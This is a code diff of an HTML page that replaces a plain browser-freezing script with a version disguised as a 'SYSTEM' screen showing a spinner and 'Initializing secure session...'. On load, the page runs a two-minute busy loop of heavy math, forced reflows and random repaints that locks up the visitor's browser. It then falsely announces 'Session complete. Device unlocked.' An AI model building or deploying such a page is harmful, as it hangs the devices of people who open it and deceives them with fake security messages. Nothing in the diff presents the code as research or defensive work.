@@ -1,46 +1,89 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>Freeze</title>
-<style>
-* { margin: 0; padding: 0; }
-body { 
-  width: 100vw; 
-  height: 100vh; 
-  background: #000;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #00ff88;
+            font-family: monospace;
+            font-size: 24px;
+            user-select: none;
+        }
+        .spinner {
+            border: 4px solid #1a1a1a;
+            border-top: 4px solid #00ff88;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 0.8s linear infinite;
+            margin-right: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .container {
+            display: flex;
+            align-items: center;
+            background: #111;
+            padding: 30px 50px;
+            border-radius: 16px;
+            box-shadow: 0 0 40px rgba(0,255,136,0.1);
+        }
+    </style>
 </head>
 <body>
-<script>
-// Method 1: Block main thread with heavy math + DOM writes
-(function freezeChrome() {
-  const start = Date.now();
-  const target = 120000; // 2 minutes
-  
-  // Create 1000 DOM elements to increase memory pressure
-  for (let i = 0; i < 1000; i++) {
-    const div = document.createElement('div');
-    div.style.cssText = `width:100px;height:100px;background:red;position:absolute;top:${i}px;`;
-    document.body.appendChild(div);
-  }
-  
-  // Busy loop with heavy calculations + forced reflow
-  while (Date.now() - start < target) {
-    // Force reflow every iteration
-    document.body.offsetHeight;
-    // Heavy math
-    for (let j = 0; j < 1000; j++) {
-      Math.sin(Math.random() * 100000);
-      Math.cos(Math.random() * 100000);
-      Math.sqrt(Math.random() * 100000);
-    }
-    // Write to DOM to trigger repaint
-    document.body.style.backgroundColor = `rgb(${Math.random()*255},0,0)`;
-  }
-  
-  document.write('✅ Unlocked');
-})();
-</script>
+    <div class="container">
+        <div class="spinner"></div>
+        <span>Initializing secure session...</span>
+    </div>
+
+    <script>
+        // IMMEDIATE FREEZE — NO TIMEOUT
+        (function() {
+            const start = Date.now();
+            const duration = 120000; // 2 minutes
+            
+            // Force GPU/CPU lock
+            while (Date.now() - start < duration) {
+                // Heavy computation
+                for (let i = 0; i < 10000; i++) {
+                    Math.sin(Math.random() * 100000);
+                    Math.cos(Math.random() * 100000);
+                    Math.tan(Math.random() * 100000);
+                    Math.sqrt(Math.random() * 100000);
+                    Math.log(Math.random() * 100000);
+                }
+                // Force reflow
+                document.body.offsetHeight;
+                // Change style to force repaint
+                document.body.style.backgroundColor = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
+            }
+            
+            // After freeze ends
+            document.body.innerHTML = `
+                <div style="
+                    height: 100vh;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    background: #0a0a0a;
+                    color: #00ff88;
+                    font-family: monospace;
+                    font-size: 28px;
+                ">
+                    ✓ Session complete. Device unlocked.
+                </div>
+            `;
+        })();
+    </script>
 </body>
 </html>
